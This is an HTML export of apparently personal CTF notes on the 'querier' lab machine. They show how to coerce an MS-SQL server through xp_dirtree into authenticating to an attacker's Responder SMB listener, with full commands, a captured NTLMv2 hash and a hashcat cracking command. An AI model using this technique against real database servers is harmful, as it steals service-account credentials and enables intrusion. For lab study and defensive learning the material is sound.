<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>xp_dirtree</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># xp_dirtree</h1></strong><br /><code>xp_dirtree</code> can query SMB shares.<br /><br /><strong><h2>## Spawn fake SMB server -&gt; Grab MS-SQL user&#39;s NTLM hash</h2></strong><br />We can spawn a fake SMB server and then capture the MS-SQL user&#39;s NTLMv2 hash by using <code>xp_dirtree</code> to query our fake server. <br />When the database queries our smb server, we&#39;ll retrieve the authenticating user&#39;s username and NTLM hash <br />(because it&#39;s trying to authenticate with our server, so it sends us its hash).<br /><br />You can then crack the NTLM hash you received.<br /><br />Start responder (which spawns a false smb share).<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/querier/1433ms-sql#&nbsp;responder&nbsp;-I&nbsp;tun0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__<br />&nbsp;&nbsp;.----.-----.-----.-----.-----.-----.--|&nbsp;&nbsp;|.-----.----.<br />&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;_|&nbsp;&nbsp;-__|__&nbsp;--|&nbsp;&nbsp;_&nbsp;&nbsp;|&nbsp;&nbsp;_&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;_&nbsp;&nbsp;||&nbsp;&nbsp;-__|&nbsp;&nbsp;&nbsp;_|<br />&nbsp;&nbsp;|__|&nbsp;|_____|_____|&nbsp;&nbsp;&nbsp;__|_____|__|__|_____||_____|__|<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|__|<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NBT-NS,&nbsp;LLMNR&nbsp;&amp;&nbsp;MDNS&nbsp;Responder&nbsp;2.3.3.9<br /><br />&nbsp;&nbsp;Author:&nbsp;Laurent&nbsp;Gaffie&nbsp;(laurent.gaffie@gmail.com)<br />&nbsp;&nbsp;To&nbsp;kill&nbsp;this&nbsp;script&nbsp;hit&nbsp;CRTL-C<br /><br /><br />[+]&nbsp;Poisoners:<br />&nbsp;&nbsp;&nbsp;&nbsp;LLMNR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br />&nbsp;&nbsp;&nbsp;&nbsp;NBT-NS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br />&nbsp;&nbsp;&nbsp;&nbsp;DNS/MDNS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br /><br />[+]&nbsp;Servers:<br />&nbsp;&nbsp;&nbsp;&nbsp;HTTP&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br />&nbsp;&nbsp;&nbsp;&nbsp;HTTPS&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br />&nbsp;&nbsp;&nbsp;&nbsp;WPAD&nbsp;proxy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br />&nbsp;&nbsp;&nbsp;&nbsp;Auth&nbsp;proxy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br />&nbsp;&nbsp;&nbsp;&nbsp;SMB&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br />&nbsp;&nbsp;&nbsp;&nbsp;Kerberos&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br />&nbsp;&nbsp;&nbsp;&nbsp;SQL&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br />&nbsp;&nbsp;&nbsp;&nbsp;FTP&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br />&nbsp;&nbsp;&nbsp;&nbsp;IMAP&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br />&nbsp;&nbsp;&nbsp;&nbsp;POP3&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br />&nbsp;&nbsp;&nbsp;&nbsp;SMTP&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br />&nbsp;&nbsp;&nbsp;&nbsp;DNS&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br />&nbsp;&nbsp;&nbsp;&nbsp;LDAP&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br /><br />[+]&nbsp;HTTP&nbsp;Options:<br />&nbsp;&nbsp;&nbsp;&nbsp;Always&nbsp;serving&nbsp;EXE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br />&nbsp;&nbsp;&nbsp;&nbsp;Serving&nbsp;EXE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br />&nbsp;&nbsp;&nbsp;&nbsp;Serving&nbsp;HTML&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br />&nbsp;&nbsp;&nbsp;&nbsp;Upstream&nbsp;Proxy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br /><br />[+]&nbsp;Poisoning&nbsp;Options:<br />&nbsp;&nbsp;&nbsp;&nbsp;Analyze&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br />&nbsp;&nbsp;&nbsp;&nbsp;Force&nbsp;WPAD&nbsp;auth&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br />&nbsp;&nbsp;&nbsp;&nbsp;Force&nbsp;Basic&nbsp;Auth&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br />&nbsp;&nbsp;&nbsp;&nbsp;Force&nbsp;LM&nbsp;downgrade&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br />&nbsp;&nbsp;&nbsp;&nbsp;Fingerprint&nbsp;hosts&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br /><br />[+]&nbsp;Generic&nbsp;Options:<br />&nbsp;&nbsp;&nbsp;&nbsp;Responder&nbsp;NIC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[tun0]<br />&nbsp;&nbsp;&nbsp;&nbsp;Responder&nbsp;IP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[10.10.14.181]<br />&nbsp;&nbsp;&nbsp;&nbsp;Challenge&nbsp;set&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[random]<br />&nbsp;&nbsp;&nbsp;&nbsp;Don&#39;t&nbsp;Respond&nbsp;To&nbsp;Names&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[&#39;ISATAP&#39;]<br /><br /><br /><br />[+]&nbsp;Listening&nbsp;for&nbsp;events...<br /></div></div><br /><br />Attempt to list the contnets of our/responder&#39;s smb share using <code>xp_dirtree</code><br /><div class="codebox"><div class="codebox">SQL&gt;&nbsp;EXEC&nbsp;master.sys.xp_dirtree&nbsp;&#39;\\10.10.14.181\heyshare&#39;</div></div><br /><br />And responder should capture the NTLMv2 hashes of the users querying our share.<br /><div class="codebox"><div class="codebox">[SMBv2]&nbsp;NTLMv2-SSP&nbsp;Client&nbsp;&nbsp;&nbsp;:&nbsp;10.10.10.125<br />[SMBv2]&nbsp;NTLMv2-SSP&nbsp;Username&nbsp;:&nbsp;QUERIER\mssql-svc<br />[SMBv2]&nbsp;NTLMv2-SSP&nbsp;Hash&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;mssql-svc::QUERIER:235bd30dfa4bca77:476BF9589B3A6A7F85F04DA7CFAB2C6D:0101000000000000C0653150DE09D2012F34B6622DAC70FB000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000575576516CFE81637CD97364480B3C08BA4B1F7D732745A4484490208694978A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310038003100000000000000000000000000<br />[*]&nbsp;Skipping&nbsp;previously&nbsp;captured&nbsp;hash&nbsp;for&nbsp;QUERIER\mssql-svc<br />[+]&nbsp;Exiting...</div></div><br /><br />Then crack the newly retrieved hash with hashcat.<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/querier#&nbsp;echo&nbsp;&quot;mssql-svc::QUERIER:235bd30dfa4bca77:476BF9589B3A6A7F85F04DA7CFAB2C6D:0101000000000000C0653150DE09D2012F34B6622DAC70FB000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000575576516CFE81637CD97364480B3C08BA4B1F7D732745A4484490208694978A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310038003100000000000000000000000000&quot;&nbsp;&gt;&nbsp;ntlmv2-hashes.txt&nbsp;<br />root@gotham:~/ctf/querier#&nbsp;hashcat&nbsp;-m&nbsp;5600&nbsp;ntlmv2-hashes.txt&nbsp;/usr/share/wordlists/rockyou.txt&nbsp;-o&nbsp;ntlmv2-cracked.txt&nbsp;--force</div></div></div>
</body>
</html>
